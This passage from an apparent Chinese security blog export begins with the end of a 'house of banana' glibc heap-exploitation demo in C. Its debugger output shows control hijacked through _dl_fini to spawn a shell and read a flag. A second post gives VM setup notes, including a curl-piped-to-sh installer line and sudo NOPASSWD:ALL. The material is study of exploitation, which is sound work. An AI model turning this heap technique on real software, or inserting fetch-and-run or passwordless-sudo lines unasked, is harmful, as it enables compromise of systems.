- <span class="number">0x20</span>);  <span class="comment">// push p2 into unsoteded bin</span></span><br><span class="line">  <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);          <span class="comment">// force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 类似一个 uaf 修改</span></span><br><span class="line">  <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2 - <span class="number">0x10</span>;  <span class="comment">// chunk_header</span></span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x28</span>) = fake;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x31c</span>) = <span class="number">0x4011d</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x110</span>) = fake + <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x48</span>) = fake + <span class="number">0x58</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x58</span>) = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x120</span>) = fake + <span class="number">0x48</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x50</span>) = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 修改 _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next 的地址为 p2</span></span><br><span class="line">  <span class="comment">// 最后一个linkmap链表遍历 p2</span></span><br><span class="line">  <span class="comment">// 建议 p *(struct link_map *) p2_addr 看一下</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 问题：assert i &lt; nloaded 错误，因此要将 (struct linkmap *p2) -&gt;l_next 置为0</span></span><br><span class="line">  p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// l_init_called 为0</span></span><br><span class="line">  <span class="comment">// *(uint64_t*)(fake+0x31c) = 0x4011d; 像是一个magic number</span></span><br><span class="line">  <span class="comment">// 必须为其余类型的值，因此打印出来替换</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后的程序崩溃了😥.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax</span></span><br><span class="line"><span class="comment">  ► 0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">    #0  0x000055555555529b in shell () at house_of_banana.c:7</span></span><br><span class="line"><span class="comment">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142</span></span><br><span class="line"><span class="comment">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,</span></span><br><span class="line"><span class="comment">    # ...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 但是发现在gdb 调试情况下可以执行一次命令就会崩溃</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; c</span></span><br><span class="line"><span class="comment">Continuing.</span></span><br><span class="line"><span class="comment">process 6591 is executing new program: /usr/bin/dash</span></span><br><span class="line"><span class="comment">Error in re-setting breakpoint 2: Function &quot;shell&quot; not defined.</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">$ cat flag.txt</span></span><br><span class="line"><span class="comment">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]</span></span><br><span class="line"><span class="comment">[New inferior 2 (process 6594)]</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">[Detaching vfork parent process 6591 after child exec]</span></span><br><span class="line"><span class="comment">[Inferior 1 (process 6591) detached]</span></span><br><span class="line"><span class="comment">process 6594 is executing new program: /usr/bin/cat</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">flag&#123;house_of_banana_is_good&#125;</span></span><br><span class="line"><span class="comment">[Inferior 2 (process 6594) exited normally]</span></span><br><span class="line"><span class="comment">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE 入门</a></li>
<li><a href="https://bbs.kanxue.com/thread-273895.htm">House of cat新型glibc中IO利用手法解析|安全招聘|kanxue.com</a></li>
<li><a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法</a></li>
<li><a href="https://www.anquanke.com/post/id/222948">house of banana-安全客</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机配置</title>
    <url>/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<blockquote>
<p>个人常用虚拟机配置，持续更新。。。</p>
</blockquote>
<span id="more"></span>

<h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><ul>
<li>下载</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line"></span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>

<ul>
<li>插件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<ul>
<li>修改zshrc</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">	git </span><br><span class="line">	zsh-syntax-highlighting </span><br><span class="line">	zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>主题</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改zshrc</span></span><br><span class="line">ZSH_THEME=powerlevel10k/powerlevel10k</span><br></pre></td></tr></table></figure>

<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><ul>
<li>下载，解压，将 ttf 文件放入 一下文件夹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给用户自己用</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.fonts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部用户</span></span><br><span class="line">/usr/share/fonts</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfontscale</span><br><span class="line">sudo mkfontdir</span><br><span class="line">sudo fc-cache</span><br></pre></td></tr></table></figure>

<h2 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h2><ul>
<li>挂载了，但是不显示</li>
</ul>
<h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><ul>
<li>mount</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;etc&#x2F;fstab</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> .host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other 0 0</span><br></pre></td></tr></table></figure>

<h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ul>
<li>mount</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;etc&#x2F;fstab</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmhgfs-fuse /mnt/hgfs/ fuse defaults,allow_other 0 0</span><br></pre></td></tr></table></figure>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><ul>
<li>安装</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>

<ul>
<li>当前用户加入docker组</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$USER</span>  </span><br><span class="line">newgrp docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>


<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><ul>
<li>出现获得不了IP地址的情况</li>
</ul>
<ol>
<li>kali 修改 <code>/etc/network/interfaces</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找网卡名</span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 interfaces 文件</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">/etc/init.d/networking restart</span><br><span class="line">ifconfig eth0 down    </span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>ubuntu 使用命令，但是重启后又不行</li>
</ol>
<ul>
<li>ifconfig 配置IP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig ens33 &lt;IP&gt; netmask &lt;mask&gt;</span><br><span class="line">route add default gw &lt;gateway&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后使用如下命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/dhclient</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>ubuntu 修改 文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/netplan/01-network-manager-all.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">     eth0:</span><br><span class="line">       dhcp4: <span class="built_in">yes</span></span><br><span class="line">       addresses: []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line">sudo netplan try</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>

<ul>
<li>在修改 <code>/etc/NetworkManager/NetworkManager.conf</code> 配置文件的 <code>managed = true</code></li>
<li>reboot</li>
<li>后来看了这个文章解决 <a href="https://www.zhangguojian.com/2020/11/27/ubuntu-vmware-workstation-can-not-connect-network/#%E6%89%8B%E5%8A%A8%E8%8E%B7%E5%8F%96-ip">Ubuntu20.04不能连接网络及解决开机自动获取 ip 问题</a></li>
</ul>
<ol start="4">
<li>如下命令</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmcli networking off </span><br><span class="line">sudo nmcli networking on</span><br></pre></td></tr></table></figure>

<h2 id="sudo-免密"><a href="#sudo-免密" class="headerlink" title="sudo 免密"></a>sudo 免密</h2><ul>
<li>修改 <code>/etc/sudoers</code> 添加用户或者组</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定命令免密</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:/bin/useradd,/bin/chown</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有的都免密</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<h2 id="内存问题"><a href="#内存问题" class="headerlink" title="内存问题"></a>内存问题</h2><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><ul>
<li><p><strong>删除快照后任显示存在快照，如何删除干净</strong>：新建一个，然后删除，VM会把之前的快照合并后删除。</p>
<ul>
<li><a href="https://kb.vmware.com/s/article/1023657?lang=zh_CN">删除所有快照和整合快照功能常见问题解答(vmware.com)</a></li>
</ul>
</li>
<li><p>当我们删除部分大文件时，发现自己磁盘的内存没有增加。vmdk文件不会主动回缩，需要手动做shrink。并且不能有快照</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vmware-toolbox-cmd disk list</span><br><span class="line">$ sudo vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>

<ul>
<li>然后重启</li>
</ul>
<h2 id="kali-无法进入console"><a href="#kali-无法进入console" class="headerlink" title="kali 无法进入console"></a>kali 无法进入console</h2><ul>
<li>我的情况是 fstab 出现问题，共享文件夹修改 fstab</li>
</ul>
<ol>
<li>重启，进入 grub加载项</li>
<li>e 进入配置</li>
</ol>
<p>![[..&#x2F;imgs&#x2F;Pasted image 20230929200253.png]]</p>
<ol start="3">
<li>修改 linux 中的 ro &#x3D;&gt; <code>rw</code> 并加入一句 <code>init=/bin/bash</code></li>
<li>f10 进入系统</li>
<li>修改 fstab，重启重新获得界面</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li>zsh 自带插件 <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Plugins · ohmyzsh&#x2F;ohmyzsh Wiki</a></li>
</ul>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
</search>
